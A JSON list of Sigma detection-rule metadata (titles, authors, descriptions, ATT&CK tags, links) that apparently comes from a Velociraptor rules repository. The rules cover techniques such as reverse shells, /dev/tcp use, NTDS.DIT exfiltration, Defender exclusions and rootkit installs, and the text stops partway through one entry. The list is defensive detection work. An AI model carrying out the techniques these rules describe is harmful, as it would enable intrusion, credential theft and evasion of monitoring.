[{"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects when a share is mounted using the \"net.exe\" utility", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\smb\\proc_creation_win_net_use_mount_share.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002", "windows", "evtx"], "title": "Windows Share Mount Via Net.EXE"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects when an internet hosted webdav share is mounted using the \"net.exe\" utility", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\smb\\proc_creation_win_net_use_mount_internet_share.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002", "windows", "evtx"], "title": "Windows Internet Hosted WebDav Share Mount Via Net.EXE"}, {"author": "@neu5ron, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects scenarios where system auditing (i.e.: Windows event log auditing) is disabled.\nThis may be used in a scenario where an entity would want to bypass local logging to evade detection when Windows event logging is enabled and reviewed.\nAlso, it is recommended to turn off \"Local Group Policy Object Processing\" via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as \"gpedit.msc\".\nPlease note, that disabling \"Local Group Policy Object Processing\" may cause an issue in scenarios of one off specific GPO modifications - however, it is recommended to perform these modifications in Active Directory anyways.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\tampering\\evtx\\win_security_disable_event_auditing.yaml", "tags": ["attack.defense_evasion", "attack.t1562.002", "windows", "evtx"], "title": "Windows Event Auditing Disabled"}, {"author": "Christian Burkard (Nextron Systems)", "description": "Detects the Setting of Windows Defender Exclusions", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\windows_defender_exclusion_registry.yaml", "tags": ["attack.defense_evasion", "attack.t1562.001"], "title": "Windows Defender Exclusions Added - Registry"}, {"author": "Tim Rauch", "description": "Detects modifications to the Windows Defender configuration settings using PowerShell to add exclusions", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\windows_defender_exclusion_powershell.yaml", "tags": ["attack.defense_evasion", "attack.t1562", "attack.execution", "attack.t1059", "windows", "evtx"], "title": "Windows Defender Exclusions Added - PowerShell"}, {"author": "Christian Burkard (Nextron Systems)", "description": "Detects the Setting of Windows Defender Exclusions", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\windows_defender_exclusion.yaml", "tags": ["attack.defense_evasion", "attack.t1562.001"], "title": "Windows Defender Exclusions Added"}, {"author": "oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, wagga", "description": "Detects when an admin share is mounted using net.exe", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\smb\\proc_creation_win_net_use_mount_admin_share.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002", "windows", "evtx"], "title": "Windows Admin Share Mount Via Net.EXE"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the execution of whoami.exe with suspicious parent processes.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\common_commands\\proc_creation_whoami_anomaly.yaml", "tags": ["attack.discovery", "attack.t1033", "car.2016-03-001", "windows", "windows.evtx"], "title": "Whoami.EXE Execution Anomaly"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the execution of whoami.exe with suspicious parent processes.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\common_commands\\sysmon_proc_creation_whoami_anomaly.yaml", "tags": ["attack.discovery", "attack.t1033", "car.2016-03-001", "windows", "windows.evtx"], "title": "Whoami.EXE Execution Anomaly"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\common_commands\\proc_creation_win_susp_whoami_as_param.yaml", "tags": ["attack.discovery", "attack.t1033", "car.2016-03-001", "windows", "evtx", "generic"], "title": "WhoAmI as Parameter"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects the use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\"", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\file_event\\file_event_lnx_wget_download_file_in_tmp_dir.yaml", "tags": ["attack.command_and_control", "attack.t1105", "os.linux"], "title": "Wget Creating Files in Tmp Directory"}, {"author": "Cian Heasley, Florian Roth (Nextron Systems)", "description": "Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\child_processes\\proc_creation_win_webshell_tool_recon.yaml", "tags": ["attack.persistence", "attack.t1505.003", "windows", "evtx", "webserver.generic"], "title": "Webshell Tool Reconnaissance Activity"}, {"author": "Ilyas Ochkov, Beyu Denis, oscd.community", "description": "Detects possible command execution by web application/web shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_web_rce.yaml", "tags": ["attack.persistence", "attack.t1505.003", "os.linux"], "title": "Webshell Remote Command Execution"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects certain parent child patterns found in cases in which a web shell is used to perform certain credential dumping or exfiltration activities on a compromised system\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\child_processes\\proc_creation_win_webshell_hacking.yaml", "tags": ["attack.persistence", "attack.t1505.003", "attack.t1018", "attack.t1033", "attack.t1087", "windows", "evtx", "webserver.generic"], "title": "Webshell Hacking Activity Patterns"}, {"author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, Anton Kutepov, oscd.community", "description": "Detects certain command line parameters often used during reconnaissance activity via web shells", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\child_processes\\proc_creation_win_webshell_recon_commands_and_processes.yaml", "tags": ["attack.persistence", "attack.t1505.003", "attack.t1018", "attack.t1033", "attack.t1087", "windows", "evtx", "webserver.generic"], "title": "Webshell Detection With Command Line Keywords"}, {"author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)", "description": "Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like \"C:\\windows\\system32\\davclnt.dll,DavSetCookie\".\nThis could be an indicator of exfiltration or use of WebDav to launch code (hosted on a WebDav server).\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_webdav_client_execution.yaml", "tags": ["attack.exfiltration", "attack.t1048.003", "windows", "evtx", "lolbas"], "title": "WebDav Client Execution Via Rundll32.EXE"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the load of a signed WinRing0 driver often used by threat actors, crypto miners (XMRIG) or malware for privilege escalation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\driver\\win_driver_load_winring0.yaml", "tags": ["attack.privilege_escalation", "attack.t1543.003", "windows", "windows.evtx", "sysmon"], "title": "Vulnerable WinRing0 Driver Load"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects usage of \"vim\" and it's siblings as a GTFOBin to execute and proxy command and binary execution", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_gtfobin_vim.yaml", "tags": ["attack.discovery", "attack.t1083", "os.linux"], "title": "Vim GTFOBin Abuse - Linux"}, {"author": "Tuan Le (NCSGroup)", "description": "Detects execution of the \"userdel\" binary. Which is used to delete a user account and related files. This is sometimes abused by threat actors in order to cover their tracks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_userdel.yaml", "tags": ["attack.impact", "attack.t1531", "os.linux"], "title": "User Has Been Deleted Via Userdel"}, {"author": "TuanLe (GTSC)", "description": "Detects usage of the \"usermod\" binary to add users add users to the root or suoders groups", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_usermod_susp_group.yaml", "tags": ["attack.privilege_escalation", "attack.persistence", "os.linux"], "title": "User Added To Root/Sudoers Group Using Usermod"}, {"author": "David Burkett, @signalblur", "description": "Detects calls to hidden files or files located in hidden directories in NIX systems.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_hidden_binary_execution.yaml", "tags": ["attack.defense_evasion", "attack.t1574.001", "os.linux"], "title": "Use Of Hidden Paths Or Files"}, {"author": "Peter Matkovski, IAI", "description": "Detect unix shell configuration modification. Adversaries may establish persistence through executing malicious commands triggered when a new shell is opened.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_unix_shell_configuration_modification.yaml", "tags": ["attack.persistence", "attack.t1546.004", "os.linux"], "title": "Unix Shell Configuration Modification"}, {"author": "frack113", "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\crowdstrike\\proc_creation_win_uninstall_crowdstrike_falcon.yaml", "tags": ["attack.defense_evasion", "attack.t1562.001", "windows", "windows.evtx", "antivirus"], "title": "Uninstall Crowdstrike Falcon Sensor"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects attempts to force stop the ufw using ufw-init", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_disable_ufw.yaml", "tags": ["attack.defense_evasion", "attack.t1562.004", "os.linux"], "title": "Ufw Force Stop Using Ufw-Init"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the execution of \"openssl\" to connect to an IP address. This techniques was used by UNC4841 to exfiltrate SSL certificates and as a C2 channel with named pipes. Investigate commands executed in the temporal vicinity of this command.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\UNC4841-Barracuda-ESG-Zero-Day-Exploitation\\proc_creation_lnx_apt_unc4841_openssl_connection.yaml", "tags": ["attack.defense_evasion", "attack.t1140", "detection.emerging_threats"], "title": "UNC4841 - SSL Certificate Exfiltration Via Openssl"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of specific named binaries which were used by UNC4841 to deploy their SEASPY backdoor", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\UNC4841-Barracuda-ESG-Zero-Day-Exploitation\\proc_creation_lnx_atp_unc4841_seaspy_execution.yaml", "tags": ["attack.execution", "detection.emerging_threats"], "title": "UNC4841 - Potential SEASPY Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects filename pattern of email related data used by UNC4841 for staging and exfiltration", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\UNC4841-Barracuda-ESG-Zero-Day-Exploitation\\file_event_lnx_apt_unc4841_exfil_mail_pattern.yaml", "tags": ["attack.execution", "attack.persistence", "attack.defense_evasion", "detection.emerging_threats"], "title": "UNC4841 - Email Exfiltration File Pattern"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of \"wget\" to download a \"tar\" from an IP address that doesn't have a trusted certificate. As seen used by UNC4841 during their Barracuda ESG zero day exploitation.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\UNC4841-Barracuda-ESG-Zero-Day-Exploitation\\proc_creation_lnx_apt_unc4841_wget_download_tar_files_direct_ip.yaml", "tags": ["attack.defense_evasion", "attack.t1140", "detection.emerging_threats"], "title": "UNC4841 - Download Tar File From Untrusted Direct IP Via Wget"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of \"wget\" to download a \".zip\" or \".rar\" files from \"temp.sh\". As seen used by UNC4841 during their Barracuda ESG zero day exploitation.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\UNC4841-Barracuda-ESG-Zero-Day-Exploitation\\proc_creation_lnx_apt_unc4841_wget_download_compressed_file_tmep_sh.yaml", "tags": ["attack.defense_evasion", "attack.t1140", "detection.emerging_threats"], "title": "UNC4841 - Download Compressed Files From Temp.sh Using Wget"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects file indicators as seen used by UNC4841 during their Barracuda ESG zero day exploitation.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\UNC4841-Barracuda-ESG-Zero-Day-Exploitation\\file_event_lnx_apt_unc4841_file_indicators.yaml", "tags": ["attack.execution", "attack.persistence", "attack.defense_evasion", "detection.emerging_threats"], "title": "UNC4841 - Barracuda ESG Exploitation Indicators"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects default install commands of the Triple Cross eBPF rootkit based on the \"deployer.sh\" script", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_triple_cross_rootkit_install.yaml", "tags": ["attack.defense_evasion", "attack.t1014", "os.linux"], "title": "Triple Cross eBPF Rootkit Install Commands"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of a the file \"execve_hijack\" which is used by the Triple Cross rootkit as a way to elevate privileges", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_triple_cross_rootkit_execve_hijack.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "os.linux"], "title": "Triple Cross eBPF Rootkit Execve Hijack"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of \"ebpfbackdoor\" files in both \"cron.d\" and \"sudoers.d\" directories. Which both are related to the TripleCross persistence method", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\file_event\\file_event_lnx_triple_cross_rootkit_persistence.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "attack.t1053.003", "os.linux"], "title": "Triple Cross eBPF Rootkit Default Persistence"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of the file \"rootlog\" which is used by the TripleCross rootkit as a way to check if the backdoor is already running.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\file_event\\file_event_lnx_triple_cross_rootkit_lock_file.yaml", "tags": ["attack.defense_evasion", "os.linux"], "title": "Triple Cross eBPF Rootkit Default LockFile"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects usage of the \"touch\" process in service file.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_touch_susp.yaml", "tags": ["attack.defense_evasion", "attack.t1070.006", "os.linux"], "title": "Touch Suspicious Service File"}, {"author": "Tuan Le (NCSGroup)", "description": "Detects usage of command line tools such as \"kill\", \"pkill\" or \"killall\" to terminate or signal a running process.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_kill_process.yaml", "tags": ["attack.defense_evasion", "attack.t1562", "os.linux"], "title": "Terminate Linux Process Via Kill"}, {"author": "Pawel Mazur", "description": "Detects a creation of systemd services which could be used by adversaries to execute malicious code.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_systemd_service_creation.yaml", "tags": ["attack.persistence", "attack.t1543.002", "os.linux"], "title": "Systemd Service Creation"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, oscd.community", "description": "Detects system information discovery commands", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_system_info_discovery2.yaml", "tags": ["attack.discovery", "attack.t1082", "os.linux"], "title": "System and Hardware Information Discovery"}, {"author": "Timur Zinniatullin, oscd.community", "description": "Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_user_discovery.yaml", "tags": ["attack.discovery", "attack.t1033", "os.linux"], "title": "System Owner or User Discovery"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal and remotephone, oscd.community", "description": "Detects enumeration of local network configuration", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_system_network_discovery.yaml", "tags": ["attack.discovery", "attack.t1016", "os.linux"], "title": "System Network Discovery - Linux"}, {"author": "Daniil Yugoslavskiy, oscd.community", "description": "Detects usage of system utilities to discover system network connections", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_system_network_connections_discovery.yaml", "tags": ["attack.discovery", "attack.t1049", "os.linux"], "title": "System Network Connections Discovery - Linux"}, {"author": "Pawel Mazur", "description": "Detects System Information Discovery commands", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_system_info_discovery.yaml", "tags": ["attack.discovery", "attack.t1082", "os.linux"], "title": "System Information Discovery - Auditd"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, oscd.community", "description": "Detects system information discovery commands", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_system_info_discovery.yaml", "tags": ["attack.discovery", "attack.t1082", "os.linux"], "title": "System Information Discovery"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious command lines that look as if they would create symbolic links to /etc/passwd", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_syamlink_etc_passwd.yaml", "tags": ["attack.t1204.001", "attack.execution", "os.linux"], "title": "Symlink Etc Passwd"}, {"author": "frack113", "description": "Detects a suspicious call to the user32.dll function that locks the user workstation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_user32_dll.yaml", "tags": ["attack.defense_evasion", "windows", "evtx", "lolbas"], "title": "Suspicious Workstation Locking via Rundll32"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)", "description": "Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially a sign of exploitation of CVE-2023-23397\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_webdav_client_susp_execution.yaml", "tags": ["attack.exfiltration", "attack.t1048.003", "cve.2023.23397", "windows", "evtx", "lolbas"], "title": "Suspicious WebDav Client Execution Via Rundll32.EXE"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious VSFTPD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\vsftpd\\lnx_vsftpd_susp_error_messages.yaml", "tags": ["attack.initial_access", "attack.t1190", "os.linux"], "title": "Suspicious VSFTPD Error Messages"}, {"author": "frack113", "description": "Detects suspicious command with /dev/tcp", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_susp_dev_tcp.yaml", "tags": ["attack.reconnaissance", "os.linux"], "title": "Suspicious Use of /dev/tcp"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_susp_shellexec_execution.yaml", "tags": ["attack.defense_evasion", "windows", "evtx", "lolbas"], "title": "Suspicious Usage Of ShellExec_RunDLL"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\proc_creation_win_ntdsutil_susp_usage.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "windows", "evtx"], "title": "Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_proc_creation_win_ntdsutil_susp_usage.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "sysmon", "windows", "evtx"], "title": "Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)"}, {"author": "Bhabesh Raj", "description": "Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\remote_administration_tools\\vnc\\proc_creation_win_ultravnc_susp_execution.yaml", "tags": ["attack.lateral_movement", "attack.g0047", "attack.t1021.005"], "title": "Suspicious UltraVNC Execution"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects a tscon.exe start as LOCAL SYSTEM", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\rdp\\proc_creation_win_tscon_localsystem.yaml", "tags": ["attack.command_and_control", "attack.t1219", "windows", "evtx"], "title": "Suspicious TSCON Start as SYSTEM"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects suspicious scheduled task creation events. Based on attributes such as paths, commands line flags, etc.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\schtask\\evtx_schtask_win_suspicious_creation.yaml", "tags": ["attack.execution", "attack.privilege_escalation", "attack.persistence", "attack.t1053.005"], "title": "Suspicious Scheduled Task Creation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects suspicious scheduled task creation events. Based on attributes such as paths, commands line flags, etc.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\schtask\\schtask_win_suspicious_creation.yaml", "tags": ["attack.execution", "attack.privilege_escalation", "attack.persistence", "attack.t1053.005", "windows", "evtx"], "title": "Suspicious Scheduled Task Creation"}, {"author": "frack113, Zaw Min Htun (ZETA)", "description": "Detects suspicious process related to rundll32 based on arguments", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_script_run.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "windows", "evtx", "lolbas"], "title": "Suspicious Rundll32 Script in CommandLine"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_inline_vbs.yaml", "tags": ["attack.defense_evasion", "attack.t1055", "windows", "evtx", "lolbas"], "title": "Suspicious Rundll32 Invoking Inline VBScript"}, {"author": "Hieu Tran", "description": "Detects the execution of Rundll32.exe with DLL files masquerading as image files", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_susp_execution_with_image_extension.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "windows", "evtx", "lolbas"], "title": "Suspicious Rundll32 Execution With Image Extension"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_sys.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "windows", "evtx", "lolbas"], "title": "Suspicious Rundll32 Activity Invoking Sys File"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_shell_susp_rev_shells.yaml", "tags": ["attack.execution", "attack.t1059.004", "os.linux"], "title": "Suspicious Reverse Shell Command Line"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects a suspicious RDP session redirect using tscon.exe", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\rdp\\proc_creation_win_tscon_rdp_redirect.yaml", "tags": ["attack.lateral_movement", "attack.t1563.002", "attack.t1021.001", "car.2013-07-002", "windows", "evtx"], "title": "Suspicious RDP Redirect Using TSCON"}, {"author": "juju4, Jonhnathan Ribeiro, oscd.community", "description": "Detects suspicious process run from unusual locations", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_run_locations.yaml", "tags": ["attack.defense_evasion", "attack.t1036", "car.2013-05-002", "windows", "evtx", "lolbas"], "title": "Suspicious Process Start Locations"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious process patterns used in NTDS.DIT exfiltration", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\proc_creation_win_susp_ntds.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "windows", "evtx"], "title": "Suspicious Process Patterns NTDS.DIT Exfil"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious process patterns used in NTDS.DIT exfiltration", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_proc_creation_win_susp_ntds.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "sysmon", "windows", "evtx"], "title": "Suspicious Process Patterns NTDS.DIT Exfil"}, {"author": "Thomas Patzke, Florian Roth (Nextron Systems), Zach Stanford @svch0st, Tim Shelton, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potentially suspicious processes being spawned by a web server process which could be the result of a successfully placed web shell or exploitation\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\child_processes\\proc_creation_win_webshell_susp_process_spawned_from_webserver.yaml", "tags": ["attack.persistence", "attack.t1505.003", "attack.t1190", "windows", "evtx", "webserver.generic"], "title": "Suspicious Process By Web Server Process"}, {"author": "Teymur Kheirkhabarov, Harish Segar", "description": "Detects a suspicious or uncommon parent processes of PowerShell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\powershell\\proc_creation_win_powershell_susp_parent_process.yaml", "tags": ["attack.execution", "attack.t1059.001", "windows", "evtx", "powershell", "generic"], "title": "Suspicious PowerShell Parent Process"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects installation of suspicious packages using system installation utilities", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_install_suspicioua_packages.yaml", "tags": ["attack.defense_evasion", "attack.t1553.004", "os.linux"], "title": "Suspicious Package Installed - Linux"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious SSH / SSHD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\sshd\\lnx_sshd_susp_ssh.yaml", "tags": ["attack.initial_access", "attack.t1190", "os.linux"], "title": "Suspicious OpenSSH Daemon Error"}, {"author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)", "description": "Detects suspicious use of the WSMAN provider without PowerShell.exe as the host application.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\remote_powershell\\posh_pc_wsman_com_provider_no_powershell.yaml", "tags": ["attack.execution", "attack.t1059.001", "attack.lateral_movement", "attack.t1021.003", "windows", "evtx"], "title": "Suspicious Non PowerShell WSMAN COM Provider"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects execution of binaries located in potentially suspicious locations via \"nohup\"", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_nohup_susp_execution.yaml", "tags": ["attack.execution", "os.linux"], "title": "Suspicious Nohup Execution"}, {"author": "frack113", "description": "Adversaries may use to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\remote_powershell\\posh_ps_susp_new_psdrive.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002", "windows", "evtx"], "title": "Suspicious New-PSDrive to Admin Share"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious DNS error messages that indicate a fatal or 